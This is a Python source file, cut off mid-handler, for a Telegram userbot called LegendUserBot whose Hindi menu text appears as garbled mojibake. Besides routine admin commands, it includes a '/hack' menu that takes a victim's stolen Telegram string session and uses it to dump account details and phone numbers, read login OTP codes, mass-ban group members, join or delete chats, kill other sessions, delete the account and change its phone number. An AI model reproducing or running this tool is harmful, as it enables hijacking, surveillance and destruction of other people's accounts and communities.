import asyncio
import os
import re
from os import system

from telethon import Button, events

api_id = os.environ.get("APP_ID")
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")

from userbot import *

from . import *
from .helpers.hack import *

mybot = "missrose_bot"

legendboy = 5122474448


from telethon import Button, custom, events

from . import legendversion
from .core.logger import logging
from .core.session import legend, tgbot

LOGS = logging.getLogger("LegendUserBot")
LEGEND_PIC = "https://telegra.ph/file/e753315316673cff51085.mp4"

onbot = "рдкреНрд░рд╛рд░рдВрдн - рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдореИрдВ рдЬреАрд╡рд┐рдд рд╣реВрдВ \nрд╣реИрдХ - рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рд╕реА рдХреЛ рднреА рд╣реИрдХ рдХрд░реЗрдВ\nрдкрд┐рдВрдЧ - рдкреЛрдВрдЧ!\nunban - рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА/рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо \ntr - <lang-code> \nрдкреНрд░рд╕рд╛рд░рдг - рдмреЙрдЯ рдореЗрдВ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рдВрджреЗрд╢ рднреЗрдЬрддрд╛ рд╣реИ \nid - рдХреА рдЖрдИрдбреА рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рдореАрдбрд┐рдпрд╛ред \naddnote - рдиреЛрдЯ рдЬреЛрдбрд╝реЗрдВ \nрдиреЛрдЯреНрд╕ - рдиреЛрдЯреНрд╕ рджрд┐рдЦрд╛рддрд╛ рд╣реИ \nрд╕реНрдкреИрдо - рд╕реНрдкреИрдо рд╡реИрд▓реНрдпреВ рдЯреЗрдХреНрд╕реНрдЯ (рдорд╛рди < 100)\nbigspam - рд╕реНрдкреИрдо рд╡реИрд▓реНрдпреВ рдЯреЗрдХреНрд╕реНрдЯ (рдорд╛рди> 100) \nraid - рд░реЗрдб рд╡реИрд▓реНрдпреВ рдХрд┐рд╕реА рдХреЛ рднреА рд░рд┐рдкреНрд▓рд╛рдИ рдХрд░реЗрдВ \nрд░рд┐рдкреНрд▓рд╛рдИрдб - рдХрд┐рд╕реА рдХреЛ рднреА рд░рд┐рдкреНрд▓рд╛рдИ рдХрд░реЗрдВ \ndreplyraid - рд░рд┐рдкреНрд▓рд╛рдИ рдХрд░реЗрдВ рдХрд┐рд╕реА рдХреЗ рд▓рд┐рдП рднреА \nrmnote - рдиреЛрдЯ рд╣рдЯрд╛рдПрдВ \nlive - рдХреНрдпрд╛ рдореИрдВ рдЬреАрд╡рд┐рдд рд╣реВрдВ? \nbun - рд╕рдореВрд╣ рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред \nunbun - рд╕рдореВрд╣ рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╣рдЯрд╛ рджреЗрдВ \nprumote - рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрддрд╛ рд╣реИ \ndemute - рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдбрд┐рдореЛрдЯ рдХрд░рддрд╛ рд╣реИ \nрдкрд┐рди - рдПрдХ рд╕рдВрджреЗрд╢ рдкрд┐рди рдХрд░рддрд╛ рд╣реИ \nрдЖрдВрдХрдбрд╝реЗ - рдмреЙрдЯ рдореЗрдВ рдХреБрд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджрд┐рдЦрд╛рддрд╛ рд╣реИ \npurge - рдЙрд╕ рд╕рдВрджреЗрд╢ рд╕реЗ рдЗрд╕рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдВ рдЬрд┐рд╕реЗ рдЖрдк рд╣рдЯрд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ (рдЖрдкрдХреЗ рдмреЙрдЯ рдХреЛ рдЪрд╛рд╣рд┐рдП рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдмрдиреЗрдВ) \ndel - рдПрдХ рд╕рдВрджреЗрд╢ рдХрд╛ рдЙрддреНрддрд░ рджреЗрдВ рдЬрд┐рд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП (рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХрд╛ рдмреЙрдЯ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП)"

perf = "[ рд▓реАрдЬреЗрдВрдбрдмреЛрдЯ ]"

bot = legend


async def killer():
    LEGEND_USER = bot.me.first_name
    The_LegendBoy = bot.uid
    legd_mention = f"[{LEGEND_USER}](tg://user?id={The_LegendBoy})"
    name = f"{legd_mention}'s рд╕рд╣рд╛рдпрдХ"
    description = f"рдореИрдВ {legd_mention} рдХрд╛ рд╕рд╣рд╛рдпрдХ рд╣реВрдВред рдпрд╣ рдмреЙрдЯ рдЖрдкрдХреЛ рдореЗрд░реЗ рдорд╛рд╕реНрдЯрд░ рдХреЗ рд╕рд╛рде рдЪреИрдЯ рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИ"
    starkbot = await legend.tgbot.get_me()
    bot_name = starkbot.first_name
    botname = f"@{starkbot.username}"
    if bot_name.endswith("рд╕рд╣рд╛рдпрдХ"):
        print("рдмреЛрдЯ рд╕реНрдЯрд╛рд░реНрдЯрд┐рдВрдЧ")
    else:
        try:
            await bot.send_message("@BotFather", "/setinline")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", perf)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setcommands")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", onbot)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setname")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", name)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setdescription")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", description)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setuserpic")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_file("@BotFather", "userbot/resources/pics/main.jpg")
            await asyncio.sleep(2)
        except Exception as e:
            print(e)


async def legends():
    LEGEND_USER = bot.me.first_name
    The_LegendBoy = bot.uid
    legd_mention = f"[{LEGEND_USER}](tg://user?id={The_LegendBoy})"
    yescaption = f"рдирдорд╕реНрддреЗ рд╕рд░/рдорд┐рд╕ рдХреБрдЫ рд╣реБрдЖ \nрдбрд┐рдВрдЧ рдбреЛрдВрдЧ рдЯрд┐рдВрдЧ рдЯреЛрдВрдЧ рдкрд┐рдВрдЧ рдкреЛрдВрдЧ\nрд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд▓реАрдЬреЗрдВрдбрдмреЙрдЯ рдХреЛ рддреИрдирд╛рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ \nрдореЗрд░реЗ рдорд╛рд╕реНрдЯрд░ ~ уАО{legd_mention}уАП \nVersion ~ {legendversion}\nрдореЗрд░реЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдиреАрдЪреЗ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВЁЯСЗЁЯП╛ЁЯСЗЁЯСЗЁЯП╝"
    try:
        TRY = [(Button.inline("тнР рд╕реНрдЯрд╛рд░реНрдЯ тнР", data="start"))]
        await tgbot.send_file(
            bot.me.id, LEGEND_PIC, caption=yescaption, buttons=TRY, incoming=True
        )
    except:
        pass


@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
async def help(event):
    starkbot = await tgbot.get_me()
    bot_id = starkbot.first_name
    if event.query.user_id is not bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message=f"рдЕрд░реЗ рд╕рд░ рдЗрдЯреНрд╕ рдореА {bot_id}, рдЖрдкрдХреА рдЕрд╕рд┐рд╕реНрдЯреЗрдВрдЯ! рдореИрдВ рдХреИрд╕реЗ рдЖрдкрдХреА рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ?",
            buttons=[
                [
                    Button.url("ЁЯСитАНЁЯПл рд╕рдкреЛрд░реНрдЯ ", "https://t.me/Legend_K_Userbot"),
                    Button.url("ЁЯдЦ рдЕрдкрдбреЗрдЯреНрд╕ ", "https://t.me/Official_k_LegendBot"),
                ],
                [
                    custom.Button.inline("ЁЯСд рдпреВрдЬрд░реНрд╕", data="users"),
                    custom.Button.inline("тЪЩ рд╕реИрдЯрд┐рдВрдЧреНрд╕", data="osg"),
                ],
                [custom.Button.inline("рд╣реИрдХ", data="hack")],
            ],
        )
    else:
        await event.answer(
            "рдХреНрд╖рдорд╛ рдХрд░реЗрдВ рдЖрдк рдЗрд╕ рдмрдЯрди рдХреЛ рдПрдХреНрд╕реЗрд╕ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ", cache_time=0, alert=True
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"osg")))
async def help(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="рдЖрдк рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╕реЗрдЯрд┐рдВрдЧ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рд╕рд░",
            buttons=[
                [
                    custom.Button.inline("тЩ╗я╕П рдкреБрдирд░реНрдкреНрд░рд╛рд░рдВрдн рдХрд░реЗрдВ", data="restart"),
                    custom.Button.inline("ЁЯдЦ рд╢рдЯ рдбрд╛рдЙрди", data="shutdown"),
                ],
                [
                    custom.Button.inline("ЁЯЧТ рд╡рд╛рд░", data="strvar"),
                    custom.Button.inline("ЁЯСйтАНЁЯТ╗ рдХрдорд╛рдВрдбреНрд╕", data="gibcmd"),
                ],
                [custom.Button.inline("тЬи рдмреИрдХ тЬи", data="start")],
            ],
        )
    else:
        await event.answer(
            "рдХреНрд╖рдорд╛ рдХрд░реЗрдВ рдХреЗрд╡рд▓ рдореЗрд░реЗ рдЧреБрд░реБ рд╣реА рдЗрд╕ рдмрдЯрди рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ",
            cache_time=0,
            alert=True,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"shutdown")))
async def rel(event):
    if event.query.user_id == bot.uid:
        await event.answer("рд╢рдЯрдбрд╛рдЙрди рд▓реАрдЬреЗрдВрдбрдмреЛрдЯ...", cache_time=0, alert=True)
        if BOTLOG:
            await event.client.send_message(BOTLOG_CHATID, "#SHUTDOWN \n" "рдмреЙрдЯ рд╢рдЯ рдбрд╛рдЙрди")
        if HEROKU_APP is not None:
            HEROKU_APP.process_formation()["worker"].scale(0)
        else:
            os._exit(143)
    else:
        await event.answer(
            "рдХреНрд╖рдорд╛ рдХрд░реЗрдВ рдХреЗрд╡рд▓ рдореЗрд░реЗ рдЧреБрд░реБ рд╣реА рдЗрд╕ рдмрдЯрди рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ",
            cache_time=0,
            alert=True,
        )


@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"restart")))
async def restart(event):
    if event.query.user_id == bot.uid:
        await event.answer(
            "рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рд╣реЛ рд░рд╣рд╛ рд╣реИ рдХреГрдкрдпрд╛ 4 рдорд┐рдирдЯ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВ... ",
            cache_time=0,
            alert=True,
        )
        if BOTLOG:
            LEGEND = await event.client.send_message(
                BOTLOG_CHATID, "# RESTART \n" "рдмреЙрдЯ рдлрд┐рд░ рд╕реЗ рд╢реБрд░реВ"
            )
        try:
            ulist = get_collectionlist_items()
            for i in ulist:
                if i == "restart_update":
                    del_keyword_collectionlist("restart_update")
        except Exception as e:
            LOGS.error(e)
        try:
            add_to_collectionlist("restart_update", [LEGEND.chat_id, LEGEND.id])
        except Exception as e:
            LOGS.error(e)
        try:
            await legend.disconnect()
        except CancelledError:
            pass
        except Exception as e:
            LOGS.error(e)
    else:
        await event.answer(
            "рдХреНрд╖рдорд╛ рдХрд░реЗрдВ рдХреЗрд╡рд▓ рдореЗрд░реЗ рдЧреБрд░реБ рд╣реА рдЗрд╕ рдмрдЯрди рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ ",
            cache_time=0,
            alert=True,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"strvar")))
async def help(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="рдЖрдк рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╕реЗрдЯрд┐рдВрдЧ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рд╕рд░",
            buttons=[
                [
                    custom.Button.inline("рд╡рд╛рд░ рдПрдХреНрд╕рдкреНрд▓реЗрди", data="var"),
                    custom.Button.inline("рд╕рднреА рд╡рд╛рд░", data="allvar"),
                ],
                [custom.Button.inline("рдкреАрдЫреЗ", data="osg")],
            ],
        )
    else:
        await event.answer(
            "рдХреНрд╖рдорд╛ рдХрд░реЗрдВ рдХреЗрд╡рд▓ рдореЗрд░реЗ рдЧреБрд░реБ рд╣реА рдЗрд╕ рдмрдЯрди рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ",
            cache_time=0,
            alert=True,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"var")))
async def users(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message=".set var <varname> <value> ex:- .set var ALIVE_NAME LegendBoy \n\n рд╕рднреА рд╡рд╛рд░ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд╛рдкрд╕ рдЬрд╛рдПрдВ рдФрд░ рд╕рднреА рд╡рд╛рд░ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ",
            buttons=[
                [custom.Button.inline("рдкреАрдЫреЗ", data="osg")],
            ],
        )
    else:
        await event.answer("рд╕реЙрд░реА рджрд┐рд╕ рдмрдЯрди рдУрдирд▓реА рдорд╛рдИ рдорд╛рд╕реНрдЯрд░", cache_time=0, alert=True)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"allvar")))
async def users(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message=" do .setdb",
            buttons=[
                [custom.Button.inline("рдмреИрдХ", data="osg")],
            ],
        )
    else:
        await event.answer("рд╕реЙрд░реА рджрд┐рд╕ рдмрдЯрди рдУрдирд▓реА рдорд╛рдИ рдорд╛рд╕реНрдЯрд░", cache_time=0, alert=True)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"gibcmd")))
async def users(event):
    if event.query.user_id == bot.uid:
        grabon = "Hello Here Are Some Commands \nтЮд /start - Check if I am Alive \nтЮд /ping - Pong! \nтЮд /tr <lang-code> \nтЮд /broadcast - Sends Message To all Users In Bot \nтЮд /id - Shows ID of User And Media. \nтЮд /addnote - Add Note \nтЮд /notes - Shows Notes \nтЮд /rmnote - Remove Note \nтЮд /alive - Am I Alive? \nтЮд /bun - Works In Group , Bans A User. \nтЮд /unbun - Unbans A User in Group \nтЮд /prumote - Promotes A User \nтЮд /demute - Demotes A User \nтЮд /pin - Pins A Message \nтЮд /stats - Shows Total Users In Bot \nтЮд /purge - Reply It From The Message u Want to Delete (Your Bot Should be Admin to Execute It) \nтЮд /del - Reply a Message Tht Should Be Deleted (Your Bot Should be Admin to Execute It)"
        await tgbot.send_message(event.chat_id, grabon)
    else:
        await event.answer(
            "рдПрдХ рдорд┐рдирдЯ рд░реБрдХреЛ, рддреБрдо рдореЗрд░реЗ рдорд╛рд▓рд┐рдХ рдирд╣реАрдВ рд╣реЛ рддреЛ рдЗрд╕ рдмрдЯрди рдХреЛ рдЫреВрдиреЗ рдХреА рддреБрдореНрд╣рд╛рд░реА рд╣рд┐рдореНрдордд рдХреИрд╕реЗ рд╣реБрдИ",
            cache_time=0,
            alert=True,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"close")))
async def help(event):
    await event.delete()


menu = """
рдореЗрд░реЗ рд╕рдВрджреЗрд╢ рдХрд╛ рдЙрддреНрддрд░ рджреЗрдВ рдпрджрд┐ рдореИрдВ рд╕рдореВрд╣ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реВрдБ

"A" :~ [рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЕрдкрдиреЗ рд╕рдореВрд╣реЛрдВ рдФрд░ рдЪреИрдирд▓реЛрдВ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ]

"B" :~ [рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдЬреИрд╕реЗ рдлрд╝реЛрди рдирдВрдмрд░, usrname... рдЖрджрд┐ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ]

"C" :~ [рдПрдХ рд╕рдореВрд╣ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░реЗрдВ (рдореБрдЭреЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рдФрд░ рдЪреИрдирд▓/рд╕рдореВрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рджреЗрдВ рдореИрдВ рд╡рд╣рд╛рдВ рд╕рднреА рд╕рджрд╕реНрдпреЛрдВ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░ рджреВрдВрдЧред)]

"D" :~ [рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдВрддрд┐рдо рдУрдЯреАрдкреА рдЬрд╛рдиреЗрдВ {рдкрд╣рд▓рд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рдХрд▓реНрдк рдмреА рдлреЛрди рдирдВрдмрд░ рд▓реЗрдВ рдФрд░ рд╡рд╣рд╛рдВ рдЦрд╛рддрд╛ рд▓реЙрдЧрд┐рди рдХрд░реЗрдВ рдлрд┐рд░ рдореЗрд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдореИрдВ рдЖрдкрдХреЛ рдУрдЯреАрдкреА рджреВрдВрдЧрд╛}]

"E" :~ [StringSession рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рд╕рдореВрд╣/рдЪреИрдирд▓ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ]

"F" :~ [рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рд╕рдореВрд╣/рдЪреИрдирд▓ рдЫреЛрдбрд╝реЗрдВ]

"G" :~ [рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рд╕рдореВрд╣/рдЪреИрдирд▓ рд╣рдЯрд╛рдПрдВ]

"H" :~ [рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рджреЛ рдЪрд░рдг рд╕рдХреНрд╖рдо рдпрд╛ рдЕрдХреНрд╖рдо рд╣реИрдВ]

"I" :~ [рдЕрдкрдиреЗ StringSession рдХреЛ рдЫреЛрдбрд╝рдХрд░ рд╕рднреА рдореМрдЬреВрджрд╛ рд╕рдХреНрд░рд┐рдп рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕реЗрд╢рди рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░реЗрдВ]

"J" :~ [рдЦрд╛рддрд╛ рд╣рдЯрд╛ рджреЛ]

"K" :~ [рдПрдХ рд╕рдореВрд╣/рдЪреИрдирд▓ рдореЗрдВ рд╕рднреА рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХреЛрдВ рдХреЛ рдкрджрд╛рд╡рдирдд рдХрд░реЗрдВ]

"L" ~ [рдХрд┐рд╕реА рд╕рджрд╕реНрдп рдХреЛ рд╕рдореВрд╣/рдЪреИрдирд▓ рдореЗрдВ рдкреНрд░рдЪрд╛рд░рд┐рдд рдХрд░реЗрдВ]

"M" ~ [StringSession рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝реЛрди рдирдВрдмрд░ рдмрджрд▓реЗрдВ]

I will add more features Later ЁЯШЕ
"""

keyboard = [
    [
        Button.inline("A", data="Ahack"),
        Button.inline("B", data="Bhack"),
        Button.inline("C", data="Chack"),
        Button.inline("D", data="Dhack"),
        Button.inline("E", data="Ehack"),
    ],
    [
        Button.inline("F", data="Fhack"),
        Button.inline("G", data="Ghack"),
        Button.inline("H", data="Hhack"),
        Button.inline("I", data="Ihack"),
        Button.inline("J", data="Jhack"),
    ],
    [
        Button.inline("K", data="Khack"),
        Button.inline("L", data="Lhack"),
        Button.inline("M", data="Mhack"),
    ],
    [Button.inline("рдкреАрдЫреЗ", data="osg")],
]


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"hack")))
async def start(event):
    global menu
    if event.query.user_id == bot.uid:
        await event.delete()
        async with tgbot.conversation(event.chat_id) as x:
            await x.send_message(
                f"рдЪреБрдиреЗрдВ рдХрд┐ рдЖрдк рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рдХреЗ рд╕рд╛рде рдХреНрдпрд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ \n\n{menu}",
                buttons=keyboard,
            )
    else:
        await event.answer(
            "рдЖрдкрдХреЛ рдЗрд╕ рд╣реИрдХ рдмрдЯрди рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд╣реИ", cache_time=0, alert=True
        )


@legend.tgbot.on(
    events.NewMessage(pattern="/hack", func=lambda x: x.sender_id == bot.uid)
)
async def start(event):
    global menu
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message(
            f"рдЪреБрдиреЗрдВ рдХрд┐ рдЖрдк рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рдХреЗ рд╕рд╛рде рдХреНрдпрд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ \n\n{menu}",
            buttons=keyboard,
        )


@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("ЁЯУНрд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕реАрдЬрди рджреАрдЬрд┐рдП")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред\n /hack", buttons=keyboard
            )
        try:
            i = await userchannels(strses.text)
        except:
            return await event.reply(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ.\n/hack", buttons=keyboard
            )
        if len(i) > 3855:
            file = open("session.txt", "w")
            file.write(i + "\n\nрд▓реАрдЬреЗрдВрдбрдмреЙрдп рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╡рд░рдг")
            file.close()
            await bot.send_file(event.chat_id, "session.txt")
            system("rm -rf session.txt")
        else:
            await event.reply(
                i + "\n\nрд▓реАрдЬреЗрдВрдбрдмреЙрдп рдмреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж. \n/hack",
                buttons=keyboard,
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Bhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("ЁЯФ░рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рджреЗрдВ")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ", buttons=keyboard
            )
        i = await userinfo(strses.text)
        await event.reply(
            i + "\n\nрд▓реАрдЬреЗрдВрдбрдмреЙрдпрдмреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж.\n/hack",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Chack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await userbans(strses.text, grpid.text)
        await event.reply(
            "Banning all members. рд▓реАрдЬреЗрдВрдбрдмреЙрдпрдмреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Dhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ.", buttons=keyboard
            )
        i = await usermsgs(strses.text)
        await event.reply(
            i + "\n\nрд▓реАрдЬреЗрдВрдбрдмреЙрдпрдмреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ehack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ.", buttons=keyboard
            )
        await x.send_message("GROUP/CHANNEL USERNAME/ID рджреЛ")
        grpid = await x.get_response()
        await joingroup(strses.text, grpid.text)
        await event.reply(
            "Joined the Channel/Group. рд▓реАрдЬреЗрдВрдбрдмреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Fhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
